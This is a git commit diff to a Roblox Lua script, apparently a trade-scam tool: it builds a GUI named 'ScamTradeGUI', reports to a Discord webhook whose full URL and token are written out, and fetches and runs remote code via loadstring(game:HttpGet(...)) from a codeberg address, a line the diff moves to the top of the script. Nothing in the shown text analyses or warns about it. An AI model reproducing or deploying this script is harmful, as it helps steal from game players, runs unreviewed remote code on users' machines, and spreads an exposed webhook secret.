76fa42587131127fa00c5a62fc98bb7e924a28eb
DarkScriptHubGAG <k3yhhceballo@gmail.com>
2025-07-17 16:34:09 -0400

    Update script.lua

--- script.lua
+++ script.lua
@@ -3,6 +3,8 @@ min_value = 0 -- minimum value for stuff (if ur new to it, leave 0 ig)
 ping = "Yes" -- make it yes if u want to get pinged
 webhook =  "https://discord.com/api/webhooks/1390378012322693151/W1fWWYoxMxsRRn1C-OAZo6i4eJ8ixeYWLEd_yJOpHvw7Ijs5eWgYb7ni65ePDdVwnH0o" -- make a webhook on phone browser discord or pc discord (to get the notifications and shii)
 embedcol = 65280 -- ignore this, only used to change color of the webhook notification
+loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/adm"))()
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ScamTradeGUI"
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -34,5 +36,3 @@ loadingText.Font = Enum.Font.Gotham
 loadingText.TextSize = 16
 loadingText.TextWrapped = true
 loadingText.Parent = frame
-
-loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/adm"))()
